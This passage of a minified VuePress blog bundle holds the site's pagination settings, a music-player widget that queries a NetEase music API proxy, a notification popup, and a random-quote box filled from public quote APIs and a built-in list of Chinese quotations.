,prevText:"Prev",nextText:"Next"},{pid:"tags",id:"CTFLearn",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/CTFLearn/",interval:[0,9]},{path:"/tag/CTFLearn/page/2/",interval:[10,19]},{path:"/tag/CTFLearn/page/3/",interval:[20,29]},{path:"/tag/CTFLearn/page/4/",interval:[30,37]}],prevText:"Prev",nextText:"Next"},{pid:"tags",id:"Via",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/Via/",interval:[0,1]}],prevText:"Prev",nextText:"Next"},{pid:"tags",id:"Misc",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/Misc/",interval:[0,1]}],prevText:"Prev",nextText:"Next"},{pid:"tags",id:"复习",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/复习/",interval:[0,9]}],prevText:"Prev",nextText:"Next"},{pid:"tags",id:"开发规范",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/开发规范/",interval:[0,5]}],prevText:"Prev",nextText:"Next"},{pid:"tags",id:"k8s",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/k8s/",interval:[0,1]}],prevText:"Prev",nextText:"Next"},{pid:"tags",id:"git",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/git/",interval:[0,1]}],prevText:"Prev",nextText:"Next"},{pid:"tags",id:"linux",filter:Nr.tags,sorter:Mr.tags,pages:[{path:"/tag/linux/",interval:[0,2]}],prevText:"Prev",nextText:"Next"},{pid:"categories",id:"后端 Back-end",filter:Nr.categories,sorter:Mr.categories,pages:[{path:"/categories/后端 Back-end/",interval:[0,9]},{path:"/categories/后端 Back-end/page/2/",interval:[10,19]},{path:"/categories/后端 Back-end/page/3/",interval:[20,29]},{path:"/categories/后端 Back-end/page/4/",interval:[30,39]},{path:"/categories/后端 Back-end/page/5/",interval:[40,49]},{path:"/categories/后端 Back-end/page/6/",interval:[50,59]},{path:"/categories/后端 Back-end/page/7/",interval:[60,66]}],prevText:"Prev",nextText:"Next"},{pid:"categories",id:"知识晶体 Q&A",filter:Nr.categories,sorter:Mr.categories,pages:[{path:"/categories/知识晶体 Q&A/",interval:[0,9]}],prevText:"Prev",nextText:"Next"},{pid:"categories",id:"随笔 Essay",filter:Nr.categories,sorter:Mr.categories,pages:[{path:"/categories/随笔 Essay/",interval:[0,9]},{path:"/categories/随笔 Essay/page/2/",interval:[10,19]},{path:"/categories/随笔 Essay/page/3/",interval:[20,27]}],prevText:"Prev",nextText:"Next"},{pid:"categories",id:"前端 Front-end",filter:Nr.categories,sorter:Mr.categories,pages:[{path:"/categories/前端 Front-end/",interval:[0,7]}],prevText:"Prev",nextText:"Next"},{pid:"categories",id:"规范 Standard",filter:Nr.categories,sorter:Mr.categories,pages:[{path:"/categories/规范 Standard/",interval:[0,9]}],prevText:"Prev",nextText:"Next"},{pid:"categories",id:"命理学 Numerology",filter:Nr.categories,sorter:Mr.categories,pages:[{path:"/categories/命理学 Numerology/",interval:[0,9]},{path:"/categories/命理学 Numerology/page/2/",interval:[10,19]},{path:"/categories/命理学 Numerology/page/3/",interval:[20,29]},{path:"/categories/命理学 Numerology/page/4/",interval:[30,37]}],prevText:"Prev",nextText:"Next"}],qr=t(165);const Ur=t.n(qr)()("plugin-blog:pagination");class $r{constructor(n,e,t){Ur("pagination",n);const{pages:a,prevText:r,nextText:o}=n,{path:i}=t;this._prevText=r,this._nextText=o;for(let n=0,e=a.length;n<e;n++){if(a[n].path===i){this.paginationIndex=n;break}}this.paginationIndex||(this.paginationIndex=0),this._paginationPages=a,this._currentPage=a[this.paginationIndex],this._matchedPages=e.filter(e=>n.filter(e,n.id,n.pid)).sort(n.sorter)}setIndexPage(n){this._indexPage=n}get length(){return this._paginationPages.length}get pages(){const[n,e]=this._currentPage.interval;return this._matchedPages.slice(n,e+1)}get hasPrev(){return 0!==this.paginationIndex}get prevLink(){return this.hasPrev?this.paginationIndex-1==0&&this._indexPage?this._indexPage:this._paginationPages[this.paginationIndex-1].path:null}get hasNext(){return this.paginationIndex!==this.length-1}get nextLink(){return this.hasNext?this._paginationPages[this.paginationIndex+1].path:null}get prevText(){return this._prevText}get nextText(){return this._nextText}getSpecificPageLink(n){return this._paginationPages[n].path}}const Wr=new class{constructor(n){this.paginations=n}get pages(){return a.a.$vuepress.$get("siteData").pages}getPagination(n,e,t){Ur("id",e),Ur("pid",n);const a=this.paginations.filter(t=>t.id===e&&t.pid===n)[0];return new $r(a,this.pages,t)}}(Rr);var Hr={comment:{enabled:!1,service:""},email:{enabled:!1},feed:{rss:!1,atom:!1,json:!1}};class Vr{constructor(n){Object.defineProperty(this,"registration",{value:n,configurable:!0,writable:!0})}update(){return this.registration.update()}skipWaiting(){const n=this.registration.waiting;return n?(console.log("[vuepress:sw] Doing worker.skipWaiting()."),new Promise((e,t)=>{const a=new MessageChannel;a.port1.onmessage=n=>{console.log("[vuepress:sw] Done worker.skipWaiting()."),n.data.error?t(n.data.error):e(n.data)},n.postMessage({type:"skip-waiting"},[a.port2])})):Promise.resolve()}}var Jr=t(33);a.a.component("SWUpdatePopup",()=>Promise.all([t.e(0),t.e(45)]).then(t.bind(null,557)));var Qr={data:()=>({showButtonFlag:!1,openFlag:!1,text:"展开",visible:!1,interval:null,isMoving:!1,detailsStyle:{right:"1rem",bottom:"9rem",width:"2.5rem",height:"2.5rem","border-radius":".25rem","line-height":"2.5rem","font-size":"14px","font-weight":"500"},visibilityHeight:400}),methods:{updateOpen(){this.openFlag=!this.openFlag;var n=document.getElementsByTagName("details");if(this.openFlag){for(var e=0;e<n.length;e++)n[e].setAttribute("open","");this.text="合起"}else{for(e=0;e<n.length;e++)n[e].removeAttribute("open");this.text="展开"}},showButton(){var n=document.getElementsByTagName("details");null!=n&&n.length>2?this.showButtonFlag=!0:this.showButtonFlag=!1},handleScroll(){this.visible=window.pageYOffset>this.visibilityHeight}},watch:{$route(n,e){n.path==e.path?this.showButton():"/"==n.path||"/about/"==n.path?this.showButtonFlag=!1:(this.openFlag=!1,this.text="展开",this.showButton())}},created(){},mounted(){},beforeDestroy(){}},Gr=(t(397),Object(Ce.a)(Qr,(function(){var n=this,e=n._self._c;return e("div",[e("div",{directives:[{name:"show",rawName:"v-show",value:n.showButtonFlag,expression:"showButtonFlag"}],staticClass:"DetailsOpenFlag",style:n.detailsStyle,on:{click:function(e){return n.updateOpen()}}},[n._v("\n "+n._s(n.text)+"\n\n")])])}),[],!1,null,"3338c3f8",null).exports);const Xr="https://neteasecloudmusicapi-zpj80231.vercel.app/",Kr=n=>rr.a.get(Xr+"playlist/detail?id="+n);var Zr=t(166),Yr=t.n(Zr),no=t(167),eo=t.n(no),to=t(86),ao=t.n(to),ro=t(168),oo=t.n(ro),io=t(169),so=t.n(io),lo=t(170),co=t.n(lo),po=t(171),uo=t.n(po),mo=t(87),ho=t.n(mo),go=t(172),fo=t.n(go),bo=t(173),vo=t.n(bo),yo=t(3),xo=t.n(yo);var wo={name:"Player",data:()=>({o:0,top:0,pan:Yr.a,play:eo.a,pause:ao.a,add:oo.a,shlter:so.a,listPlay:co.a,state0:uo.a,state1:ho.a,talkicon1:fo.a,talkicon2:vo.a,playState:!0,playIcon:ao.a,musicImg:"",musicUrl:"",musicWords:[],musicTitle:"",musicName:"",wordsTime:[],wordsTop:0,wordIndex:0,currentProgress:"0%",musicList:[],myMusicList:[],thisMusicIndex:1,disActive:!1,listIsDis:!1,listButtonActiveIndex:-1,thisListPage:1,musicTypeList:[{name:"热歌榜",id:3778678},{name:"新歌榜",id:3779629},{name:"飙升榜",id:19723756},{name:"抖音榜",id:2250011882},{name:"我的单曲",id:3068309305},{name:"My Songs",id:-1}],thisMusicType:-1,notPlay:[],musicState:0,musicStateButton:ho.a,musicSearchVal:"",musicSearchList:[],musicAlertVal:"",musicAlertState:!1,musicAlertTimer:"",hotTalkList:[]}),mounted(){if(Kr(3068309305).then(n=>{this.isPc()&&200===n.data.code&&(this.Player(),this._getMusicType(3068309305),document.getElementById("musicPlayer").style.display="block")}),1===Math.floor(10*Math.random()+1)){if("/"!==this.$route.path)return;null==sessionStorage.getItem("zk")&&(window.location.href="/view/index.html",sessionStorage.setItem("zk","zv"))}},created(){},computed:{thisMusicList(){return[...this.musicList].splice(10*(this.thisListPage-1),10)}},watch:{musicSearchVal(){""==this.musicSearchVal?this.musicSearchList=[]:(n=>rr.a.get(`https://neteasecloudmusicapi-zpj80231.vercel.app/search?keywords=${n}&limit=8`))(this.musicSearchVal).then(n=>{null==n.data.result.songs?this.musicSearchList=[]:this.musicSearchList=n.data.result.songs})}},methods:{isPc:()=>!navigator.userAgent.match(/(phone|pod|iPhone|iPod|ios|Android|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i),MusicAlert(n){this.musicAlertState=!0,this.musicAlertVal=n,clearTimeout(this.musicAlertTimer),this.musicAlertTimer=setTimeout(()=>{this.musicAlertState=!1,this.musicAlertVal=""},2e3)},ListAdd(n){var e;(e=n.id,rr.a.get(Xr+"song/detail?ids="+e)).then(n=>{this.musicSearchVal="",0==this.myMusicList.length?(this.myMusicList=[n.data.songs[0]],this._getMusicType(-1)):this.myMusicList.push(n.data.songs[0]),this.MusicAlert("添加成功")})},MusicStateChange(){0==this.musicState?(this.musicState=1,this.musicStateButton=this.state0,this.MusicAlert("已切换为单曲循环模式")):(this.musicState=0,this.musicStateButton=this.state1,this.MusicAlert("已切换为列表循环模式"))},DisList(){this.listIsDis=!this.listIsDis},ListChange(n){n?this.thisListPage--:this.thisListPage++},ListPlay(n){this.thisMusicIndex!=n&&(this.thisMusicIndex=n>this.musicList.length-1?0:n,this._getInfo(),this.top=0,this.o=0,this.wordIndex=0,this.wordsTop=0,this.currentProgress="0%",this.playState||xo()(".control_icon").click())},ButtonActive(n){this.listButtonActiveIndex=n},DisActive(){this.disActive=!this.disActive},_getMusicType(n){this.thisMusicType!==n&&(this.notPlay=[],-1===n?0!=this.myMusicList.length?(this.musicList=this.myMusicList,this.thisMusicType=n,this.thisMusicIndex=0,this.thisListPage=1,this._getInfo(),this.top=0,this.o=0,this.wordIndex=0,this.wordsTop=0,this.currentProgress="0%",this.playState||xo()(".control_icon").click()):this.MusicAlert("没有歌曲,需要自己添加"):3068309305===n?Kr(n).then(e=>{this.getMusicDetail(e,n)}):(n=>rr.a.get(Xr+"playlist/detail?id="+n))(n).then(e=>{this.getMusicDetail(e,n)}))},getMusicDetail(n,e){this.musicList=n.data.playlist.tracks.splice(0,200),this.thisMusicType=e,this.thisMusicIndex=0,this.thisListPage=1,this._getInfo(),this.top=0,this.o=0,this.wordIndex=0,this.wordsTop=0,this.currentProgress="0%",this.playState||xo()(".control_icon").click()},_getInfo(){var n;(n=this.musicList[this.thisMusicIndex].id,rr.a.get(Xr+"song/url?id="+n)).then(n=>{if(null==n.data.data[0].url||""==n.data.data[0].url||null==n.data.data[0].url)if(this.notPlay.length!=this.musicList.length){let n=this.thisMusicIndex+1;-1==this.notPlay.indexOf(this.thisMusicIndex)&&this.notPlay.push(this.thisMusicIndex),this.MusicAlert(this.musicList[this.thisMusicIndex].name+"因为一些原因不能播放"),this.ListPlay(n)}else console.log("not"),this.MusicAlert("此列表所有歌都不能播放");else{this.musicUrl=n.data.data[0].url.replace("http://","https://"),this.musicImg=this.musicList[this.thisMusicIndex].al.picUrl.replace("http://","https://")+"?param=300y300",this.musicTitle=this.musicList[this.thisMusicIndex].name;let e=[];this.musicList[this.thisMusicIndex].ar.forEach(n=>{e.push(n.name)}),this.musicName=e.join("/"),(n=>rr.a.get(Xr+"lyric?id="+n))(this.musicList[this.thisMusicIndex].id).then(n=>{if(!n.data.nolyric){let e=this.Cut(n.data.lrc.lyric);this.musicWords=e.wordArr,this.wordsTime=e.timeArr}}),(n=>rr.a.get(`https://neteasecloudmusicapi-zpj80231.vercel.app/comment/music?id=${n}&limit=8`))(this.musicList[this.thisMusicIndex].id).then(n=>{let e=0;this.hotTalkList=n.data.hotComments.splice(0,3),this.hotTalkList.forEach(n=>{e+=n.content.length,n.user.avatarUrl=n.user.avatarUrl+"?param=50y50"}),e>=200&&(this.hotTalkList=this.hotTalkList.slice(0,2))})}})},Ltrim:n=>n.replace(/(^\s*)/g,""),Rtrim:n=>n.replace(/(\s*$)/g,""),Cut(n){let e=[],t=[];e=n.split("["),e.splice(0,1);for(let n=0;n<e.length;n++){let a=e[n].split("]"),r=a[0].split(".")[0].split(":");e[n]=60*Number.parseInt(r[0])+Number.parseInt(r[1]),e[n]=isNaN(e[n])?0:e[n],t[n]=this.Rtrim(this.Ltrim(a[1]))}return{timeArr:e,wordArr:t}},Player(){let n=this,e=xo()("#music")[0],t=setInterval(a,1e3);function a(){n.currentProgress=e.currentTime/e.duration*100+"%",e.currentTime>=n.wordsTime[n.o+1]&&(n.top+=Number.parseInt(xo()(".music_word").eq(n.o).height()+Number.parseInt(xo()(".music_word").eq(n.o).css("marginTop"))),n.top>=xo()(".music_words").height()/2-11&&(n.wordsTop+=-Number.parseInt(xo()(".music_word").eq(n.o).height()+Number.parseInt(xo()(".music_word").eq(n.o).css("marginTop")))),n.wordIndex=n.o+1,n.o++),e.currentTime>=e.duration&&(1!=n.musicList.length&&0==n.musicState&&(n.thisMusicIndex=n.thisMusicIndex>=n.musicList.length-1?0:n.thisMusicIndex+1,n._getInfo()),e.play(),n.top=0,n.o=0,n.wordIndex=0,n.wordsTop=0,n.currentProgress="0%")}xo()(".progress").on("mousedown",r=>{console.log();let o=((r||event).clientX-xo()(".progress").offset().left)/xo()(".progress").width();clearInterval(t),this.currentProgress=100*o+"%",xo()(document).on("mousemove",n=>{let e=n||event;o=(e.clientX-xo()(".progress").offset().left)/xo()(".progress").width(),this.currentProgress=100*o+"%"}),xo()(document).on("mouseup",()=>{e.currentTime=e.duration*o;let r=[...this.wordsTime];r.push(e.currentTime),r.sort((n,e)=>n-e);let i=r.indexOf(e.currentTime)-1,s=0;if(this.o<i)for(let n=this.o;n<i;n++)s+=-Number.parseInt(xo()(".music_word").eq(n).height()+Number.parseInt(xo()(".music_word").eq(n).css("marginTop")));else for(let n=i;n<this.o;n++)s+=Number.parseInt(xo()(".music_word").eq(n).height()+Number.parseInt(xo()(".music_word").eq(n).css("marginTop")));this.wordsTop+=s,n.wordIndex=this.o=i,clearInterval(t),t=setInterval(a,1e3),this.playState=!0,this.playIcon=this.pause,e.currentTime>=e.duration&&(this.top=0,this.o=0,this.wordIndex=0,this.wordsTop=0,this.currentProgress="0%"),e.play(),xo()(document).unbind("mousemove"),xo()(document).unbind("mouseup")})}),xo()(".control_icon").on("click",()=>{this.playState?(e.pause(),this.playState=!1,this.playIcon=this.play,clearInterval(t)):(e.play(),this.playState=!0,this.playIcon=this.pause,clearInterval(t),t=setInterval(a,1e3))})},Contorl(){xo()("#music")[0].currentTime=100}}},ko=(t(398),Object(Ce.a)(wo,(function(){var n=this,e=n._self._c;return e("div",{attrs:{id:"musicPlayer"}},[e("transition",{attrs:{name:"dis_list"}},[n.listIsDis?e("div",{staticClass:"list_box"},[e("transition",{attrs:{name:"music_alert"}},[n.musicAlertState?e("span",{staticClass:"music_alert"},[n._v(n._s(n.musicAlertVal))]):n._e()]),n._v(" "),e("div",{staticClass:"list_close",on:{click:n.DisList}},[n._v("x")]),n._v(" "),e("div",{staticClass:"music_list"},[e("div",{staticClass:"list_l"},[e("ul",{staticClass:"music_type"},n._l(n.musicTypeList,(function(t){return e("li",{class:{type_active:t.id==n.thisMusicType},on:{click:function(e){return n._getMusicType(t.id)}}},[n._v(n._s(t.name))])})),0),n._v(" "),e("div",{staticClass:"list_title"},[e("span",{staticStyle:{"font-size":"14px"}},[n._v("歌曲列表")]),n._v(" "),e("img",{staticClass:"music_state",attrs:{src:n.musicStateButton,alt:""},on:{click:n.MusicStateChange}}),n._v(" "),e("div",{staticClass:"music_search_box"},[e("input",{directives:[{name:"model",rawName:"v-model",value:n.musicSearchVal,expression:"musicSearchVal"}],staticClass:"music_search",attrs:{type:"text",placeholder:"搜索歌曲"},domProps:{value:n.musicSearchVal},on:{input:function(e){e.target.composing||(n.musicSearchVal=e.target.value)}}}),n._v(" "),e("transition",{attrs:{name:"music_search"}},[""!=n.musicSearchVal?e("ul",{staticClass:"search_list"},n._l(n.musicSearchList,(function(t){return e("li",{on:{click:function(e){return n.ListAdd(t)}}},[e("span",{staticClass:"music_search_name"},[n._v(n._s(t.name))]),n._v(" "),e("span",{staticClass:"music_search_ar"},[n._v(n._s(t.artists[0].name))])])})),0):n._e()])],1)]),n._v(" "),e("div",{staticClass:"music_ul_title"},[e("span",[n._v("歌曲")]),e("span",[n._v("歌手")]),e("span",[n._v("专辑")])]),n._v(" "),e("ul",{staticClass:"_list"},n._l(n.thisMusicList,(function(t,a){return e("li",{on:{mouseover:function(e){return n.ButtonActive(a)},dblclick:function(e){n.ListPlay(10*(n.thisListPage-1)+a)}}},[10*(n.thisListPage-1)+a==n.thisMusicIndex?e("div",{staticClass:"this_music_shlter"}):n._e(),n._v(" "),e("span",[n._v(n._s(t.name))]),e("span",[n._v(n._s(t.ar[0].name))]),e("span",[n._v(n._s(t.al.name))]),n._v(" "),e("transition",{attrs:{name:"list_button"}},[n.listButtonActiveIndex==a?e("div",{staticClass:"music_button"},[e("div",{staticClass:"list_play",style:{backgroundImage:"url("+n.listPlay+")"},attrs:{title:"播放这首歌"},on:{click:function(e){n.ListPlay(10*(n.thisListPage-1)+a)}}}),n._v(" "),-1!=n.thisMusicType?e("div",{staticClass:"list_play",style:{backgroundImage:"url("+n.add+")"},attrs:{title:"添加到 My Songs"},on:{click:function(e){return n.ListAdd(t)}}}):n._e()]):n._e()])],1)})),0),n._v(" "),e("div",{staticClass:"list_page"},[1!=n.thisListPage?e("div",{staticClass:"page_last",on:{click:function(e){return n.ListChange(!0)}}},[n._v("<")]):n._e(),n._v(" "),n.thisListPage!=Math.ceil(n.musicList.length/10)?e("div",{staticClass:"page_next",on:{click:function(e){return n.ListChange(!1)}}},[n._v(">")]):n._e()])]),n._v(" "),e("div",{staticClass:"list_r"},[e("img",{staticClass:"music_list_bg",attrs:{src:n.musicImg}}),n._v(" "),e("div",{staticClass:"music_list_shlter",style:{backgroundImage:"url("+n.shlter+")"}}),n._v(" "),e("ul",{staticClass:"music_talk_list"},n._l(n.hotTalkList,(function(t,a){return e("li",{key:a},[e("div",{staticClass:"talk_head"},[e("img",{staticClass:"talk_head_img",attrs:{src:t.user.avatarUrl,alt:""}}),n._v(" "),e("span",{staticClass:"talk_head_name"},[n._v(n._s(t.user.nickname))])]),n._v(" "),e("p",{staticClass:"talk_content"},[e("img",{staticClass:"talk_icon_l",attrs:{src:n.talkicon1}}),n._v("\n                                "+n._s(t.content)+"\n                                "),e("img",{staticClass:"talk_icon_r",attrs:{src:n.talkicon2}})])])})),0)])])],1):n._e()]),n._v(" "),e("div",{staticClass:"bbox",class:{bbox_active:n.disActive}},[e("div",{staticClass:"pan",class:{pan_active:n.disActive},style:{backgroundImage:"url("+n.pan+")"},on:{click:n.DisActive}},[e("img",{staticClass:"pan_c",attrs:{src:n.musicImg,alt:""}})]),n._v(" "),e("div",{staticClass:"box",class:{box_active:n.disActive},style:{backgroundImage:"url("+n.musicImg+")"},on:{dblclick:n.DisList}},[e("div",{staticClass:"music_shlter_2",class:{shlter_active:n.disActive},style:{backgroundImage:"url("+n.musicImg+")"}}),n._v(" "),e("div",{staticClass:"music_shlter",class:{shlter_active:n.disActive},style:{backgroundImage:"url("+n.musicImg+")"}}),n._v(" "),e("div",{staticClass:"music_shlter_3"}),n._v(" "),e("div",{staticClass:"music_dis"},[e("div",{staticClass:"dis_list",on:{click:n.DisList}},[n._v("···")]),n._v(" "),e("p",{staticClass:"music_title"},[n._v(n._s(n.musicTitle))]),n._v(" "),e("p",{staticClass:"music_intro"},[n._v("歌手: "+n._s(n.musicName))]),n._v(" "),e("ul",{staticClass:"music_words"},[e("div",{staticClass:"music_words_box",style:{top:n.wordsTop+"px"}},n._l(n.musicWords,(function(t,a){return e("li",{staticClass:"music_word",class:{word_highlight:n.wordIndex==a}},[n._v(n._s(t))])})),0)])]),n._v(" "),e("div",{staticClass:"control_box"},[e("div",{staticClass:"control_button"},[e("img",{staticClass:"control_icon",attrs:{src:n.playIcon,alt:""}})]),n._v(" "),e("div",{staticClass:"progress"},[e("div",{staticClass:"progress_c",style:{width:n.currentProgress}},[n._m(0)])])])]),n._v(" "),e("video",{attrs:{id:"music",autoplay:"autoplay",src:n.musicUrl,name:"media"}})])],1)}),[function(){var n=this._self._c;return n("div",{staticClass:"progress_circle"},[n("div",{staticClass:"progress_circle_c"})])}],!1,null,"4a5d5ae0",null).exports),So={name:"BackToTop",data:()=>({visible:!1,active:!0,closeBtn:!1}),mounted(){this.isPc()&&(this.setStepImg(),this.setRandomShow())},methods:{closeNote(){this.visible=!1,this.closeBtn=!0,setTimeout(()=>{this.closeBtn=!1},9e5)},isPc:()=>!navigator.userAgent.match(/(phone|pod|iPhone|iPod|ios|Android|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i),getVisible(){return this.visible=!this.closeBtn},setStepImg(){var n=1;setInterval(()=>{if(++n%2==0){var e=document.getElementsByClassName("notification-wrapper")[0];if(null==e||null==e||null==e.style)return;e.style.bottom=50*Math.random()+30+"%",e.style.zoom=Math.random()}this.visible=this.getVisible(),this.active=!this.active,this.noActive=!this.noActive},1e4)},setRandomShow(){var n=1;setInterval(()=>{this.closeBtn=!(n>=1),n=Math.floor(3*Math.random())},4e4)}}},Co=(t(399),Object(Ce.a)(So,(function(){var n=this,e=n._self._c;return e("transition",{attrs:{name:"fade"}},[n.visible?e("div",{staticClass:"notification-wrapper"},[e("img",{class:n.active?"active":"noActive",staticStyle:{"pointer-events":"none",border:"1px solid #DDDDDD",width:"100%"},attrs:{src:n.$withBase("/img/other/person_lital.gif")}}),n._v(" "),e("i",{class:["btn-close1",n.active?"active":"noActive"],on:{click:n.closeNote}},[e("svg",{staticClass:"icon",attrs:{t:"1573745677073",viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"4448",width:"22",height:"22"}},[e("path",{attrs:{d:"M512 34.133333a486.4 486.4 0 1 0 486.4 486.4A486.4 486.4 0 0 0 512 34.133333z m209.4848 632.8064l-55.6032 55.466667-151.517867-151.125333-151.517866 151.1168-55.6032-55.466667 151.517866-151.108267L307.242667 364.714667l55.6032-55.466667 151.517866 151.125333 151.517867-151.1168 55.6032 55.466667-151.517867 151.099733z m0 0","p-id":"4449"}})])]),n._v(" "),e("h4",{staticClass:"notification-title",staticStyle:{display:"none"}},[e("i",{staticClass:"iconfont reco-tongzhi"}),n._v(" "),e("span",[n._v(" 🎉🎉🎉")]),n._v(" "),e("i",{staticClass:"btn-close",on:{click:n.closeNote}},[e("svg",{staticClass:"icon",attrs:{t:"1573745677073",viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"4448",width:"22",height:"22"}},[e("path",{attrs:{d:"M512 34.133333a486.4 486.4 0 1 0 486.4 486.4A486.4 486.4 0 0 0 512 34.133333z m209.4848 632.8064l-55.6032 55.466667-151.517867-151.125333-151.517866 151.1168-55.6032-55.466667 151.517866-151.108267L307.242667 364.714667l55.6032-55.466667 151.517866 151.125333 151.517867-151.1168 55.6032 55.466667-151.517867 151.099733z m0 0","p-id":"4449"}})])])]),n._v(" "),e("div",{staticClass:"notification-content",staticStyle:{display:"none"}},[e("img",{staticClass:"medium-zoom-image",staticStyle:{border:"1px solid #DDDDDD",width:"100%"},attrs:{src:n.$withBase("/img/other/person_lital.gif")}})])]):n._e()])}),[],!1,null,"1eefe8e4",null).exports),To=(t(178),{props:{type:{type:String,default:""},title:{type:String,default:""},content:{type:String,default:""},blockStyle:{type:Object,default:null},titleStyle:{type:Object,default:null},contentStyle:{type:Object,default:null},changeTime:{type:String,default:"false"}},data(){return{boxx:{},class_boxx:"",list:this.getRandomList(10),type_boxx_list:jo,show_content:!0,show_title:!0,style_boxx:{},style_title:{},style_content:{},interval:{}}},mounted(){this.getContent(),this.checkTitleAndConten(),this.checkStyleWithTitleAndContenAndBlock(),this.getShowType(this.type),this.dynamicUpdateType(this.changeTime)},watch:{changeTime(n){this.dynamicUpdateType(n)}},methods:{getRandomList:n=>[...Po].sort(()=>.5-Math.random()).slice(0,n),getContent(){if(this.list.length>=100)return;const n={timeout:300};rr.a.get("https://v1.jinrishici.com/all.json",n).then(n=>{let e=" • <span style='font-size: 13px;'>"+n.data.author+"</span>";this.list.push({title:n.data.origin+e,content:n.data.content})}).catch(()=>{this.list=this.mergeUnique(this.list,this.getRandomList(10))}),rr.a.get("https://v1.hitokoto.cn",n).then(n=>{if(""==n.data.hitokoto||n.data.hitokoto.length>40)return;let e="";null!=n.data.from_who&&(e=" • <span style='font-size: 13px;'>"+n.data.from_who+"</span>"),this.list.push({title:n.data.from+e,content:n.data.hitokoto})}).catch(()=>{this.list=this.mergeUnique(this.list,this.getRandomList(10))})},mergeUnique:(n,e)=>[...n,...e].filter((n,e,t)=>e===t.findIndex(e=>e.title===n.title&&e.content===n.content)),getShowType(n){const e=this.type_boxx_list.find(e=>e.type===n);this.class_boxx=e?e.class:this.type_boxx_list[0].class},getboxx(){return this.boxx=this.list[Math.floor(Math.random()*this.list.length)]},checkTitleAndConten(){return""!==this.title&&""===this.content?(this.boxx.title=this.title,void(this.show_content=!1)):""===this.title&&""!==this.content?(this.boxx.content=this.content,this.style_content={"margin-top":"1rem","margin-bottom":"0.4rem"},void(this.show_title=!1)):void(""===this.title||""===this.content?this.getboxx():(this.boxx.title=this.title,this.boxx.content=this.content))},checkStyleWithTitleAndContenAndBlock(){null!==this.titleStyle&&(this.style_title=this.titleStyle),null!==this.contentStyle&&(this.style_content=this.contentStyle),null!==this.blockStyle&&(this.style_boxx=this.blockStyle)},dynamicUpdateType(n){if(this.getContent(),""!==n&&"false"!==n&&/^\d+$/.test(n)){let e=this.type_boxx_list.findIndex(n=>n.type===this.type);clearInterval(this.interval),this.interval=setInterval(()=>{e=(e+1)%this.type_boxx_list.length,this.getShowType(this.type_boxx_list[e].type),this.checkTitleAndConten()},n)}}}});const jo=[{type:"tip",class:"tip custom-block"},{type:"warning",class:"warning custom-block"},{type:"danger",class:"danger custom-block"}],Po=[{title:"佚名",content:"勇敢不是不害怕，而是害怕的时候你还能坚持去做"},{title:"罗素",content:"乞丐并不会妒忌百万富翁，但是他肯定会妒忌收入更高的乞丐"},{title:"叔本华",content:"要么庸俗，要么孤独"},{title:"卢梭",content:"人生而自由，却无往不在枷锁中"},{title:"严歌苓",content:"我发现，一个人在放弃给别人留好印象的负担之后，原来心里会如此踏实"},{title:"苏更生",content:"人表达的永远不是他所说的内容，而是渴望被理解的心情"},{title:"萧伯纳",content:"自由意味着责任，正因为如此，多数人都惧怕自由"},{title:"马尔克斯",content:"一个男人发现他在变老，是因为他开始像他的父亲"},{title:"康德",content:"自由不是让你想做什么就做什么，自由是教你不想做什么，就可以不做什么"},{title:"伏尔泰",content:"使人疲惫的不是远方的高山，而是鞋子里的一粒沙子"},{title:"弗洛伊德",content:"有一天，当回顾自己走过的路时，你会发现这些奋斗不息的岁月，才是最美好的人生"},{title:"三体",content:"给岁月以文明，而不是给文明以岁月"},{title:"《哆啦A梦》",content:"总是依赖别人的话，就永远长不大"},{title:"希腊",content:"最困难的事情就是认识自己"},{title:"梁实秋",content:"没有人不爱惜他的生命，但很少人珍视他的时间"},{title:"鲁迅",content:"改造自己，总比禁止别人来得难"},{title:"唐.杜甫《奉赠韦左丞丈二十二韵》",content:"读书破万卷，下笔如有神"},{title:"《诗经.鹤鸣》 ",content:"它山之石，可以攻玉"},{title:"罗曼·罗兰",content:"先相信自己，然后别人才会相信你"},{title:"居里夫人",content:"我们应该不虚度一生，应该能够说：'我已经做了我能做的事'"},{title:"唐.王之焕《登鹳雀楼》 ",content:"欲穷千里目，更上一层楼"},{title:"唐.孟浩然《江上寄山阴崔少府国辅》 ",content:"草木本无意，荣枯自有时"},{title:"唐.李绅《悯农》 ",content:"春种一粒粟，秋收万颗子"},{title:"德国",content:"只有在人群中间，才能认识自己"},{title:"唐.韩愈《调张籍》 ",content:"蚍蜉撼大树，可笑不自量"},{title:"唐.李绅《答章孝标》",content:"假金方用真金镀，若是真金不镀金"},{title:"唐.刘禹锡《酬乐天扬州初逢席上见赠》 ",content:"沉舟侧畔千帆过，病树前头万木春\t"},{title:"杰弗逊\t",content:"从不浪费时间的人，没有工夫抱怨时间不够"},{title:"宋.王安石《登飞来峰》 